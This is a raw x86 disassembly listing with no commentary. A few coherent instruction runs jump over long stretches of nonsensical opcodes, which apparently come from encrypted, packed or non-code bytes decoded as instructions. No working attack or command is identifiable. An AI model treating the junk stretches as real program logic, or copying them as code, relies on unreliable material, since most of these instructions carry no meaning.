  401902:	push   DWORD PTR [ebp-0xc]
  401905:	call   DWORD PTR ds:0x4120b8
  40190b:	jmp    0x4018ce
  401910:	xor    eax,esi
  401912:	add    eax,edi
  401914:	mov    DWORD PTR [ecx],eax
  401916:	mov    eax,DWORD PTR [ebp-0x10]
  401919:	mov    ecx,DWORD PTR [ebp+0x10]
  40191c:	jmp    0x401c22
  401921:	xor    eax,0x752ed85c
  401926:	stos   BYTE PTR es:[edi],al
  401927:	cmc    
  401928:	pop    ebx
  401929:	push   eax
  40192a:	mov    bh,0xe1
  40192c:	retf   
  40192d:	inc    eax
  40192e:	adc    edx,DWORD PTR [esi+0x62]
  401931:	dec    esi
  401932:	jnp    0x4019b0
  401934:	jl     0x40199d
  401936:	jle    0x4019b4
  401938:	jl     0x401978
  40193a:	lds    edi,FWORD PTR cs:[ebp-0x6f]
  40193e:	aad    0xb7
  401940:	dec    esi
  401941:	push   edi
  401942:	push   esp
  401943:	push   ds
  401944:	stc    
  401945:	and    dh,BYTE PTR [esi]
  401947:	int    0xd0
  401949:	add    BYTE PTR [ebp-0x34],bl
  40194c:	adc    edi,DWORD PTR [ecx]
  40194e:	cmc    
  40194f:	ds xchg esp,eax
  401951:	and    eax,0x2a95f36e
  401956:	dec    edi
  401957:	call   0x397:0x44555c55
  40195e:	loopne 0x4019ce
  401960:	mov    esi,0x723b188e
  401965:	inc    edi
  401966:	(bad)
  401969:	inc    ebx
  40196a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40196b:	sub    DWORD PTR [eax+0x4cc044d8],eax
  401971:	mov    ds:0xb81abea,eax
  401976:	loop   0x40193b
  401978:	pushf  
  401979:	in     al,dx
  40197a:	shr    DWORD PTR [ecx+eax*4+0xbd3b015],1
  401981:	mov    ecx,0xc5087d14
  401986:	fdivr  DWORD PTR [edx-0xc115ba7]
  40198c:	call   DWORD PTR [ebx+0x2e]
  40198f:	test   al,0xad
  401991:	and    dl,BYTE PTR [ebx]
  401993:	jmp    DWORD PTR [esi-0x4d]
  401996:	aad    0x9d
  401998:	dec    ecx
  401999:	(bad)  
  40199a:	and    esp,DWORD PTR [ebx]
  40199c:	iret   
  40199d:	lock adc bl,ah
  4019a0:	out    dx,eax
  4019a1:	xchg   esi,eax
  4019a2:	cmp    BYTE PTR [edi+0x33],cl
  4019a5:	sub    dl,BYTE PTR [esp+ecx*1-0x7b]
  4019a9:	pop    es
  4019aa:	adc    eax,0xe8ca6c0a
  4019af:	imul   ebp,DWORD PTR [esi+0x29c2887d],0xf21aeb2c
  4019b9:	mov    BYTE PTR [ebp-0x5b],ch
  4019bc:	and    edi,DWORD PTR [edx-0x73a49c29]
  4019c2:	push   es
  4019c3:	gs mov esp,0x35936286
  4019c9:	mov    WORD PTR [eax-0x3d],?
  4019cc:	(bad)  
  4019ce:	dec    eax
  4019cf:	ins    DWORD PTR es:[edi],dx
  4019d0:	aam    0xa7
  4019d2:	loopne 0x40199d
  4019d4:	test   BYTE PTR [edi+0x6a],ch
  4019d7:	push   ecx
  4019d8:	xchg   edi,eax
  4019d9:	aas    
  4019da:	xchg   esi,eax
  4019db:	leave  
  4019dc:	test   dl,dl
  4019de:	push   cs
  4019df:	out    0x62,eax
  4019e1:	jb     0x40198b
  4019e3:	fld    TBYTE PTR ds:0x81b939cb
  4019e9:	or     ecx,DWORD PTR [esi-0x62bc8528]
  4019ef:	bound  ebx,QWORD PTR [ebx]
  4019f1:	adc    al,0x4b
  4019f3:	add    bh,BYTE PTR [edx+0x2b308e17]
  4019f9:	push   edi
  4019fa:	jns    0x401a75
  4019fc:	or     dh,dl
  4019fe:	lahf   
  4019ff:	mov    dl,0x4e
  401a01:	pop    edx
  401a02:	arpl   bp,cx
  401a04:	loopne 0x401a30
  401a06:	jns    0x4019b9
  401a08:	mov    edi,0x5a1395f3
  401a0d:	fcmovnb st,st(1)
  401a0f:	pop    eax
  401a10:	ss xchg ebp,eax
  401a12:	sub    al,0x88
  401a14:	mov    al,ds:0x2dc48608
  401a19:	sub    eax,0xd8956a2
  401a1e:	ficom  WORD PTR [esi+0x6a]
  401a21:	adc    DWORD PTR [ebx],esi
  401a23:	aaa    
  401a24:	out    dx,al
  401a25:	xchg   edi,eax
  401a26:	add    al,0xab
  401a28:	call   0xa2cfebbd
  401a2d:	(bad)  
  401a2e:	iret   
  401a2f:	adc    eax,0x280e57d
  401a34:	loopne 0x401ab3
  401a36:	cmp    BYTE PTR [ebx],0xac
  401a39:	out    0x4a,eax
  401a3b:	xchg   DWORD PTR [esi],edx
  401a3d:	sti    
  401a3e:	ins    DWORD PTR es:[edi],dx
  401a3f:	push   ss
  401a40:	inc    edi
  401a41:	imul   eax,DWORD PTR [ebx+0x41],0xca900442
  401a48:	jmp    0x9415:0xd420579
  401a4f:	js     0x4019d1
  401a51:	jp     0x401a0c
  401a53:	pop    es
  401a54:	cmp    esp,DWORD PTR [ebx+0x197c7559]
  401a5a:	fwait
  401a5b:	out    0x81,al
  401a5d:	pop    ecx
  401a5e:	jmp    0x2517174
  401a63:	push   ebx
  401a64:	push   0xffffffd3
  401a66:	add    al,0xc0
  401a68:	push   esp
  401a69:	retf   
  401a6a:	mov    bh,0xa2
  401a6c:	dec    ebx
  401a6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a6e:	xor    BYTE PTR ds:0xeac694d5,dl
  401a74:	es push ebp
  401a76:	inc    ecx
  401a77:	mov    ch,0x70
  401a79:	lea    edx,[ecx-0x56d97ead]
  401a7f:	jnp    0x401a07
  401a81:	ret    0xdf81
  401a84:	and    DWORD PTR [ecx-0x56],ebx
  401a87:	push   eax
  401a88:	(bad)  
  401a89:	mov    eax,ds:0xc7cd5c79
  401a8e:	push   es
  401a8f:	fwait
  401a90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a91:	add    DWORD PTR [esi+edx*4],ecx
  401a94:	pushf  
  401a95:	cmp    eax,0x8422f506
  401a9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a9b:	stos   BYTE PTR es:[edi],al
  401a9c:	add    bh,BYTE PTR [ecx+edi*1]
  401a9f:	pop    edi
  401aa0:	shl    BYTE PTR [ebx+0x96e27e6],0xa7
  401aa7:	popa   
  401aa8:	cli    
  401aa9:	mov    cl,0xf9
  401aab:	dec    ecx
  401aac:	std    
  401aad:	and    eax,0x15478840
  401ab2:	js     0x401a4c
  401ab4:	adc    eax,0x570067b6
  401ab9:	enter  0xd159,0x83
  401abd:	loope  0x401a57
  401abf:	xor    al,0xdf
  401ac1:	cmp    DWORD PTR ds:0xf72cea3c,ecx
  401ac7:	test   al,0xdd
  401ac9:	pop    ebx
  401aca:	je     0x401af4
  401acc:	xor    DWORD PTR ds:0xd0913f32,edi
  401ad2:	lock lods al,BYTE PTR ds:[esi]
  401ad4:	lds    esp,FWORD PTR [esi]
  401ad6:	sbb    al,0xe5
  401ad8:	jmp    0xe51d22fd
  401add:	cmp    al,0x73
  401adf:	and    DWORD PTR [ebx-0x73],esi
  401ae2:	fist   WORD PTR [edx-0x12c357a7]
  401ae8:	jecxz  0x401ae4
  401aea:	push   cs
  401aeb:	pop    es
  401aec:	sbb    DWORD PTR [ebx-0x46ab9fa4],eax
  401af2:	imul   ecx,eax,0x48
  401af5:	lods   eax,DWORD PTR ds:[esi]
  401af6:	ret    
  401af7:	adc    eax,0xafc8f48a
  401afc:	aad    0xa1
  401afe:	jg     0x401a88
  401b00:	jl     0x401b3d
  401b02:	(bad)  
  401b03:	fimul  DWORD PTR [ebp-0x6]
  401b06:	push   ds
  401b07:	mov    ecx,0xc8e14744
  401b0c:	cmp    ebp,DWORD PTR [esi]
  401b0e:	out    0x3,eax
  401b10:	sahf   
  401b11:	scas   al,BYTE PTR es:[edi]
  401b12:	mov    ebx,0x2659ed68
  401b17:	clc    
  401b18:	xor    BYTE PTR [ebx],ah
  401b1a:	xchg   esi,eax
  401b1b:	xor    al,0x81
  401b1d:	pop    edi
  401b1e:	fnstsw WORD PTR [edx-0x72]
  401b21:	dec    ebx
  401b22:	mov    dl,0x92
  401b24:	out    0xc5,al
  401b26:	ss dec ebx
  401b28:	test   DWORD PTR ds:0x113ef6d2,eax
  401b2e:	popa   
  401b2f:	xchg   esp,eax
  401b30:	out    0x30,al
  401b32:	test   BYTE PTR ds:0x9aeaf470,cl
  401b38:	push   ss
  401b39:	xor    BYTE PTR [edi-0x702218e0],0x69
  401b40:	adc    al,0xf8
  401b42:	push   edi
  401b43:	dec    edx
  401b44:	jno    0x401b1d
  401b46:	ins    BYTE PTR es:[edi],dx
  401b47:	adc    al,0xef
  401b49:	rol    esi,1
  401b4b:	fisub  DWORD PTR [ecx+0x6196d21]
  401b51:	add    edx,DWORD PTR [edi-0x3c8eddc7]
  401b57:	shl    DWORD PTR [ebx-0x76],1
  401b5a:	div    BYTE PTR [ecx]
  401b5c:	jl     0x401ba4
  401b5e:	imul   BYTE PTR [eax+0x24]
  401b61:	xchg   ebx,eax
  401b62:	vmaxpd xmm6,xmm5,XMMWORD PTR [ecx+0x69]
  401b67:	mov    cl,0x8f
  401b69:	stos   BYTE PTR es:[edi],al
  401b6a:	push   ds
  401b6b:	sahf   
  401b6c:	push   es
  401b6d:	call   0x164:0xea4af8d6
  401b74:	dec    edx
  401b75:	push   ebp
  401b76:	sahf   
  401b77:	aaa    
  401b78:	arpl   WORD PTR [ebx-0x603ec768],di
  401b7e:	adc    DWORD PTR [ebp-0x38],0xffffffe1
  401b82:	xchg   ebx,eax
  401b83:	pop    edi
  401b84:	push   edx
  401b85:	sub    DWORD PTR [eax-0x11],edi
  401b88:	es mov ah,0x52
  401b8b:	push   cs
  401b8c:	sar    BYTE PTR [edi],cl
  401b8e:	aaa    
  401b8f:	jne    0x401b89
  401b91:	pop    edx
  401b92:	pop    ebx
  401b93:	ja     0x401ba3
  401b95:	cmp    eax,0x87bab745
  401b9a:	pop    edx
  401b9b:	(bad)  [edi-0x220ed298]
  401ba1:	or     DWORD PTR [ecx+0x5f8bac34],edx
  401ba7:	shl    BYTE PTR [ecx+eiz*4+0x50be8258],1
  401bae:	dec    edx
  401baf:	mov    bh,0x68
  401bb1:	dec    esp
  401bb2:	sbb    BYTE PTR [ecx],al
  401bb4:	push   ds
  401bb5:	mov    dh,0xdb
  401bb7:	add    eax,0x3b357870
  401bbc:	dec    esi
  401bbd:	mov    al,0x8
  401bbf:	inc    ebp
  401bc0:	and    BYTE PTR [esi+0x1],ch
  401bc3:	test   BYTE PTR [eax-0x20],ch
  401bc6:	jo     0x401ba7
  401bc8:	or     DWORD PTR [esi+edi*2+0xf],eax
  401bcc:	cld    
  401bcd:	and    ecx,DWORD PTR [edi+0x3c]
  401bd0:	call   0x34da605d
  401bd5:	jmp    0x4a0a:0x99a5ffa3
  401bdc:	sbb    DWORD PTR [ebx-0x61488504],0xed5d33e6
  401be6:	jbe    0x401c16
  401be8:	push   0xc8841e9b
  401bed:	int    0xf5
  401bef:	jmp    0xdf4c:0xdb104fb8
  401bf6:	cmp    BYTE PTR [ebx-0x3e1780bb],dl
  401bfc:	leave  
  401bfd:	lods   eax,DWORD PTR ds:[esi]
  401bfe:	mov    fs,WORD PTR [ebx]
  401c00:	test   eax,0x69c6bfa0
  401c05:	and    eax,0x71179a45
  401c0a:	mov    edx,0xedb33dcf
  401c0f:	add    dl,0x16
  401c12:	add    BYTE PTR [eax+0x2a],cl
  401c15:	sub    al,0x96
  401c17:	xor    al,0x10
  401c19:	ds es int3 
  401c1c:	push   ebp
  401c1d:	ja     0x401c6c
  401c1f:	test   dh,dl
  401c21:	pop    esp
  401c22:	xor    ecx,esi
  401c24:	mov    edx,0xffcd8d66
  401c29:	sub    edx,ecx
  401c2b:	add    DWORD PTR [eax],edx
  401c2d:	jmp    0x401f33
  401c32:	call   0xbda4cdad
  401c37:	addr16 cmc 
  401c39:	jb     0x401c6b
  401c3b:	popa   
  401c3c:	xchg   ecx,eax
  401c3d:	and    eax,0xdaa16463
  401c42:	mov    cl,0x4
  401c44:	jl     0x401cc2
  401c46:	addr16 jle 0x401cc5
  401c49:	jl     0x401cb7
  401c4b:	push   cs
  401c4c:	xchg   edx,eax
  401c4d:	shl    ebp,cl
  401c4f:	jg     0x401c69
  401c51:	xchg   esp,eax
  401c52:	and    ebx,DWORD PTR [ecx+0x3af9036b]
  401c58:	xor    al,0xdc
  401c5a:	inc    eax
  401c5b:	(bad)  [edi+esi*1-0x4b15e730]
  401c62:	mov    eax,0x426b9cbe
  401c67:	out    0x38,al
  401c69:	jmp    0x201998d5
  401c6e:	sbb    edx,DWORD PTR [edx]
  401c70:	jae    0x401cd5
  401c72:	mov    DWORD PTR [ebx-0x383901d9],edx
  401c78:	loopne 0x401cef
  401c7a:	fldcw  WORD PTR [edi+ebx*8+0x654af5ea]
  401c81:	das    
  401c82:	jae    0x401cd1
  401c84:	sbb    BYTE PTR [ebx+0x586dcd7d],al
  401c8a:	mov    ecx,0xd420b44f
  401c8f:	ins    BYTE PTR es:[edi],dx
  401c90:	sbb    DWORD PTR [esi],ebp
  401c92:	int    0x38
  401c94:	ins    DWORD PTR es:[edi],dx
  401c95:	ins    BYTE PTR es:[edi],dx
  401c96:	and    eax,0xdf4e1290
  401c9b:	(bad)  
  401c9d:	pop    esi
  401c9e:	outs   dx,BYTE PTR ds:[esi]
  401c9f:	aam    0x83
  401ca1:	daa    
  401ca2:	adc    DWORD PTR [esp+ebp*4],edx
  401ca5:	cmc    
  401ca6:	(bad)  
  401ca7:	in     al,dx
  401ca8:	and    ch,ch
  401caa:	stos   DWORD PTR es:[edi],eax
  401cab:	stc    
  401cac:	scas   eax,DWORD PTR es:[edi]
  401cad:	out    dx,eax
  401cae:	jp     0x401cff
  401cb0:	xchg   ebx,eax
  401cb1:	sub    DWORD PTR [ecx],eax
  401cb3:	mov    cs,WORD PTR [ecx+ebx*1]
  401cb6:	ss cld 
  401cb8:	ss scas al,BYTE PTR es:[edi]
  401cba:	push   es
  401cbb:	dec    esi
  401cbc:	pop    ebx
  401cbd:	pop    ebp
  401cbe:	push   ss
  401cbf:	stos   BYTE PTR es:[edi],al
  401cc0:	jno    0x401c59
  401cc2:	stc    
  401cc3:	pushf  
  401cc4:	outs   dx,BYTE PTR ds:[esi]
  401cc5:	sbb    DWORD PTR [eax-0x23],ebx
  401cc8:	sub    DWORD PTR [esp+ebp*2],eax
  401ccb:	les    esi,FWORD PTR [edx+0x2c72e6a7]
  401cd1:	test   eax,0x9245fc99
  401cd6:	xchg   edx,eax
  401cd7:	or     bl,dh
  401cd9:	inc    esi
  401cda:	mov    edx,0x9100b7b4
  401cdf:	sub    BYTE PTR [eax],0x28
  401ce2:	add    eax,DWORD PTR [esi+ebp*8]
  401ce5:	or     eax,0xb3a9ea0a
  401cea:	mov    cl,0x2a
  401cec:	repnz fs inc edi
  401cef:	jns    0x401cc7
  401cf1:	add    eax,0xad361cf2
  401cf6:	in     eax,0x95
  401cf8:	sub    BYTE PTR [esi+0x17],cl
  401cfb:	test   eax,0x1c6dac5c
  401d01:	cmp    al,0xf1
  401d03:	jecxz  0x401d1b
  401d05:	pop    ecx
  401d06:	add    eax,0xf8d243aa
  401d0b:	je     0x401d3c
  401d0d:	jmp    0x9e82:0x6d3f6cd6
  401d14:	mov    bh,0x2
  401d16:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  401d18:	cmp    al,0x1e
  401d1a:	or     eax,esi
  401d1c:	aam    0xc2
  401d1e:	inc    ecx
  401d1f:	fstp   QWORD PTR [eax+0x6b]
  401d22:	add    dl,BYTE PTR [edi-0x574d2afa]
  401d28:	shr    BYTE PTR es:[ecx+0x2d9cbfff],cl
  401d2f:	ret    0x5a6a
  401d32:	push   eax
  401d33:	aad    0x4
  401d35:	inc    ebp
  401d36:	in     eax,dx
  401d37:	add    eax,0x8a34b768
  401d3c:	sub    edx,DWORD PTR [ebp+edi*8+0x6b864169]
  401d43:	rol    dh,cl
  401d45:	sahf   
  401d46:	or     al,0x93
  401d48:	mov    ebp,0xb620f700
  401d4d:	iret   
  401d4e:	rol    DWORD PTR [ecx],0x12
  401d51:	test   al,0xf8
  401d53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d54:	mov    ah,0x28
  401d56:	sti    
  401d57:	or     ch,dh
  401d59:	je     0x401d88
  401d5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d5d:	adc    edi,eax
  401d5f:	cwde   
  401d60:	push   ds
  401d61:	mov    DWORD PTR [edx],esi
  401d63:	or     BYTE PTR [eax+0x68],bl
  401d66:	mov    bh,0x31
  401d68:	jne    0x401d74
  401d6a:	xchg   edx,eax
  401d6b:	mov    WORD PTR [eax],fs
  401d6d:	fwait
  401d6e:	stos   DWORD PTR es:[edi],eax
  401d6f:	mov    esi,0x6b959b4d
  401d74:	mov    edx,0xc2b26b46
  401d79:	ins    BYTE PTR es:[edi],dx
  401d7a:	outs   dx,DWORD PTR ds:[esi]
  401d7b:	es mov cl,0x7
  401d7e:	(bad)  
  401d7f:	pop    ecx
  401d80:	sahf   
  401d81:	mov    ebp,0xd7096c60
  401d86:	cmp    eax,0x2fdc6007
  401d8b:	sar    BYTE PTR [ebp-0x80],1
  401d8e:	inc    edx
  401d8f:	xor    eax,0x56090fda
  401d94:	enter  0xa9ad,0xd
  401d98:	retf   
  401d99:	dec    edx
  401d9a:	out    dx,al
  401d9b:	outs   dx,DWORD PTR ds:[esi]
  401d9c:	and    eax,esi
  401d9e:	or     al,0x10
  401da0:	outs   dx,DWORD PTR ds:[esi]
  401da1:	(bad)  
  401da2:	sti    
  401da3:	mov    esi,ds
  401da5:	mov    ds:0xffd9298d,al
  401daa:	shl    BYTE PTR es:[edx],0x47
  401dae:	ds sub eax,0xb353ddef
  401db4:	ja     0x401e17
  401db6:	(bad)  
  401db7:	jno    0x401e0b
  401db9:	or     al,0x25
  401dbb:	lods   al,BYTE PTR ds:[esi]
  401dbc:	fcomi  st,st(0)
  401dbe:	mov    eax,0xa1048c67
  401dc3:	sbb    DWORD PTR [eax-0x4b0c1a77],esp
  401dc9:	pop    edx
  401dca:	outs   dx,DWORD PTR ds:[esi]
  401dcb:	nop
  401dcc:	in     eax,dx
  401dcd:	mov    dl,0xf4
  401dcf:	push   ebp
  401dd0:	mov    ds:0x4871157a,eax
  401dd5:	pop    ss
  401dd6:	xchg   DWORD PTR ds:0xbce96d81,esp
  401ddc:	(bad)  
  401ddd:	pop    ds
  401dde:	and    eax,0x4518be01
  401de3:	add    dh,bl
  401de5:	arpl   WORD PTR [edi-0x6b],bx
  401de8:	or     eax,0xf73e5d6d
  401ded:	sbb    al,0x60
  401def:	fs xor ah,ah
  401df2:	mov    ch,0xf4
  401df4:	jne    0x401e6b
  401df6:	and    BYTE PTR [edx+0x4a],ch
  401df9:	cmp    esp,ebx
  401dfb:	ins    BYTE PTR es:[edi],dx
  401dfc:	adc    al,0xb8
  401dfe:	mov    BYTE PTR cs:[esi-0x41047888],bh
  401e05:	mov    ebx,0xc6d4122f
  401e0a:	out    dx,eax
  401e0b:	mov    ch,0x2f
  401e0d:	scas   eax,DWORD PTR es:[edi]
  401e0e:	cdq    
  401e0f:	mov    ah,0xff
  401e11:	les    ecx,FWORD PTR [eax-0x25]
  401e14:	pop    ss
  401e15:	mov    dl,0xfd
  401e17:	or     eax,0xcb2c8dc8
  401e1c:	push   ds
  401e1d:	or     eax,0x2a740751
  401e22:	(bad)  
  401e23:	sub    ebp,ebp
  401e25:	rcr    DWORD PTR [edx-0x48],1
  401e28:	sti    
  401e29:	add    BYTE PTR [ecx+ecx*1],bh
  401e2c:	scas   eax,DWORD PTR es:[edi]
  401e2d:	retf   
  401e2e:	cmp    ebp,edx
  401e30:	imul   edi,DWORD PTR [eax],0xc4decd35
  401e36:	xchg   edi,eax
  401e37:	leave  
  401e38:	pop    edx
  401e39:	push   edi
  401e3a:	and    dh,BYTE PTR [edx-0x1626ba5c]
  401e40:	(bad)  
  401e41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e42:	jno    0x401e8b
  401e44:	add    DWORD PTR [ecx-0x7e],ebx
  401e47:	and    al,0x60
  401e49:	sub    ebp,DWORD PTR [edx+0x75]
  401e4c:	mov    eax,ss
  401e4e:	mov    dl,BYTE PTR [edx]
  401e50:	fnstsw WORD PTR es:[eax+0x69]
  401e54:	xchg   esp,eax
  401e55:	and    eax,0xd332e458
  401e5a:	retf   
  401e5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e5c:	mov    ebx,0x44dc1743
  401e61:	push   eax
  401e62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e63:	pmullw mm0,QWORD PTR ds:0x2b0723d8
  401e6a:	and    ebp,DWORD PTR [ebp+0x64fa54a3]
  401e70:	test   DWORD PTR ds:0x26606f37,esi
  401e76:	mov    ecx,0xf396c75e
  401e7b:	lea    ecx,[ecx]
  401e7d:	jp     0x401eb6
  401e7f:	clc    
  401e80:	sub    BYTE PTR [ecx],bl
  401e82:	cwde   
  401e83:	cs aad 0x44
  401e86:	inc    ebx
  401e87:	(bad)  
  401e88:	push   ds
  401e89:	xchg   ebp,eax
  401e8a:	xchg   esp,eax
  401e8b:	lea    ecx,[ebp+0x65]
  401e8e:	fisttp QWORD PTR [ebp+0x717256c0]
  401e94:	shr    BYTE PTR ds:0xa34f99ee,1
  401e9a:	push   eax
  401e9b:	mov    esp,esp
  401e9d:	cmp    eax,0x8e53c0df
  401ea2:	or     dh,BYTE PTR [edx-0x387e54e0]
  401ea8:	dec    esp
  401ea9:	inc    eax
  401eaa:	ss jo  0x401e84
  401ead:	cmp    BYTE PTR [edi],0x77
  401eb0:	pop    es
  401eb1:	mov    cl,0x16
  401eb3:	add    DWORD PTR [esi+0x62],0xffffff9e
  401eb7:	inc    edx
  401eb8:	aad    0x81
  401eba:	(bad)  [ecx-0x31789a02]
  401ec0:	pop    esi
  401ec1:	and    al,0x91
  401ec3:	sbb    ah,dl
  401ec5:	add    BYTE PTR [ebp+0x4c8cefb9],al
  401ecb:	sbb    esp,DWORD PTR [ebp-0x51]
  401ece:	push   esi
  401ecf:	in     al,0x46
  401ed1:	inc    edi
  401ed2:	out    dx,al
  401ed3:	pop    edx
  401ed4:	push   0xffffffe4
  401ed6:	push   ebp
  401ed7:	retf   0x5266
  401eda:	pop    esi
  401edb:	fadd   st(6),st
  401edd:	inc    ebx
  401ede:	mov    ch,0x5c
  401ee0:	push   esi
  401ee1:	es mov esp,0x7584181f
  401ee7:	das    
  401ee8:	ret    0x6c3
  401eeb:	bound  edi,QWORD PTR [ebp-0x53557bc6]
  401ef1:	xchg   ebx,eax
  401ef2:	add    al,0xfa
  401ef4:	dec    DWORD PTR [ebp+0x4a9abd0d]
  401efa:	out    dx,al
  401efb:	call   0x1a526349
  401f00:	push   es
  401f01:	adc    dh,BYTE PTR [ebx+0x39]
  401f04:	push   ss
  401f05:	int3   
  401f06:	sar    BYTE PTR [edi+0x2e708f7b],1
  401f0c:	jno    0x401ecc
  401f0e:	mov    ebp,0xbfeacd83
  401f13:	(bad)  
  401f15:	cmp    dl,BYTE PTR [edi]
  401f17:	jmp    0x46137e6b
  401f1c:	inc    esi
  401f1d:	fldcw  WORD PTR [eax]
  401f1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f20:	in     al,0x5
  401f22:	je     0x401ef2
  401f24:	fisttp DWORD PTR [ebp+0x1c]
  401f27:	and    BYTE PTR [ecx-0x582bc8a8],al
  401f2d:	cmc    
  401f2e:	push   edx
  401f2f:	and    dl,ch
  401f31:	test   al,0x8b
  401f33:	mov    eax,ds:0x413bea
  401f38:	mov    eax,DWORD PTR [eax]
  401f3a:	mov    cx,WORD PTR [ebp-0x4]
  401f3e:	movzx  ecx,cx
  401f41:	add    ecx,DWORD PTR [eax]
  401f43:	mov    DWORD PTR [ebp-0x18],ecx
  401f46:	mov    eax,DWORD PTR [ebp+0xc]
  401f49:	jmp    0x40224f
  401f4e:	adc    BYTE PTR [ebx+0x52c9c8c9],0x8d
  401f55:	pop    ebp
  401f56:	and    DWORD PTR [ebp-0x67],0xbfaf5c50
  401f5d:	push   ebp
  401f5e:	cwde   
  401f5f:	add    DWORD PTR [esp+edi*2+0x67],edi
  401f63:	jle    0x401fe1
  401f65:	jl     0x401f8d
  401f67:	test   al,0x6e
  401f69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f6a:	push   ss
  401f6b:	mov    ds:0xc508984d,eax
  401f70:	aam    0x9e
  401f72:	adc    al,0xf4
  401f74:	aam    0x9b
  401f76:	fst    st(0)
  401f78:	shr    DWORD PTR [edx-0x35542342],0xf9
  401f7f:	cmovle ebx,DWORD PTR ds:0x6b0bd293
  401f86:	push   edx
  401f87:	loope  0x401f62
  401f89:	outs   dx,DWORD PTR ds:[esi]
  401f8a:	sbb    ebp,edi
  401f8c:	ins    DWORD PTR es:[edi],dx
  401f8d:	inc    ecx
  401f8e:	push   edx
  401f8f:	cmp    DWORD PTR [ecx-0x25],edi
  401f92:	iret   
  401f93:	jecxz  0x401f7b
  401f95:	mov    DWORD PTR [eax-0x64e79681],edx
  401f9b:	shl    DWORD PTR [ecx+0x3a],1
  401f9e:	add    cl,BYTE PTR [ebx-0x1c61aaa3]
  401fa4:	pop    esi
  401fa5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401fa6:	stos   DWORD PTR es:[edi],eax
  401fa7:	fsubr  st(2),st
  401fa9:	and    dl,dl
  401fab:	and    eax,0xe4ce3fb9
  401fb0:	out    0xf3,eax
  401fb2:	cld    
  401fb3:	dec    edx
  401fb4:	stos   DWORD PTR es:[edi],eax
  401fb5:	fwait
  401fb6:	jmp    0x41953d6e
  401fbb:	in     eax,0x82
  401fbd:	push   cs
  401fbe:	cmp    BYTE PTR [esi+0x2a],dl
  401fc1:	lods   al,BYTE PTR ds:[esi]
  401fc2:	data16 sbb BYTE PTR [ebx+0x5c],bh
  401fc6:	test   DWORD PTR [edx-0x7c],edi
  401fc9:	ret    
  401fca:	sub    ah,BYTE PTR [ebx]
  401fcc:	add    al,0x87
  401fce:	dec    edi
  401fcf:	mov    eax,0xa9b12f6b
  401fd4:	cmp    edx,esp
  401fd6:	jb     0x402057
  401fd8:	cmp    ch,dl
  401fda:	mov    esi,0x7a239fda
  401fdf:	addr16 dec edi
  401fe1:	inc    ecx
  401fe2:	sbb    esi,ebp
  401fe4:	mov    bh,0xf3
  401fe6:	mov    BYTE PTR [eax+0x36],dl
  401fe9:	push   esi
  401fea:	and    al,0x55
  401fec:	adc    esp,DWORD PTR [eax-0x68]
  401fef:	pop    ds
  401ff0:	aad    0xe5
  401ff2:	pop    es
  401ff3:	aad    0xc9
  401ff5:	in     al,0xc
  401ff7:	loopne 0x40204b
  401ff9:	cmp    BYTE PTR [edi+0x2a2e5fa8],ah
  401fff:	aas    
  402000:	lock shl BYTE PTR [ebx-0x3e],cl
  402004:	mov    ds:0xabb62b36,al
  402009:	mov    al,0x29
  40200b:	sbb    DWORD PTR [ebx+0x219f2c30],ecx
  402011:	sbb    al,BYTE PTR [ebx-0x51bc3159]
  402017:	push   0xe8d58426
  40201c:	pop    eax
  40201d:	xlat   BYTE PTR ds:[ebx]
  40201e:	and    DWORD PTR [edx],ebp
  402020:	jbe    0x40209f
  402022:	or     al,0xda
  402024:	cmp    esi,DWORD PTR [ecx+edx*4+0x4c3c33f4]
  40202b:	cmp    al,0x82
  40202d:	push   esi
  40202e:	and    BYTE PTR [edi],bh
  402030:	cmp    BYTE PTR [eax+0x3022b97e],ah
  402036:	pop    edx
  402037:	ror    DWORD PTR [edx],cl
  402039:	inc    edi
  40203a:	out    dx,eax
  40203b:	dec    eax
  40203c:	pop    edi
  40203d:	xlat   BYTE PTR ds:[ebx]
  40203e:	test   dh,bh
  402040:	fs pop eax
  402042:	(bad)  
  402043:	sub    al,0x6d
  402045:	pushf  
  402046:	cdq    
  402047:	arpl   WORD PTR [ebx],bp
  402049:	dec    ecx
  40204a:	outs   dx,BYTE PTR ds:[esi]
  40204b:	push   ss
  40204c:	rcr    BYTE PTR [eax],0x6b
  40204f:	icebp  
  402050:	inc    ecx
  402051:	sbb    eax,0x7e81821b
  402056:	xor    eax,0x743a0cc0
  40205b:	scas   eax,DWORD PTR es:[edi]
  40205c:	mov    al,ds:0xf75900bf
  402061:	inc    bx
  402063:	sti    
  402064:	cdq    
  402065:	pop    eax
  402066:	js     0x402047
  402068:	stc    
  402069:	dec    eax
  40206a:	repnz fs inc edx
  40206d:	add    bh,al
  40206f:	in     al,dx
  402070:	mov    esp,ecx
  402072:	loope  0x401ff9
  402074:	in     eax,0x5e
  402076:	retf   0x2f5d
  402079:	fwait
  40207a:	fs icebp 
  40207c:	jbe    0x402013
  40207e:	pop    DWORD PTR [edx]
  402080:	push   esi
  402081:	fs adc eax,0x7791d535
  402087:	sbb    al,0xfc
  402089:	cwde   
  40208a:	mov    bl,0x53
  40208c:	lods   eax,DWORD PTR ds:[esi]
  40208d:	outs   dx,DWORD PTR ds:[esi]
  40208e:	add    eax,0xb8d4a14f
  402093:	sub    BYTE PTR [edi-0x2675a457],dl
  402099:	ja     0x402061
  40209b:	(bad)  
  40209c:	enter  0x2eb8,0xaa
  4020a0:	pushf  
  4020a1:	xchg   DWORD PTR [eax-0x17],esi
  4020a4:	in     al,0xca
  4020a6:	jne    0x4020a9
  4020a8:	push   ebx
  4020a9:	imul   edi,DWORD PTR [edi-0x3442c33],0xb091c7cc
  4020b3:	sub    eax,DWORD PTR [edi-0x72]
  4020b6:	mov    esi,0xde27a713
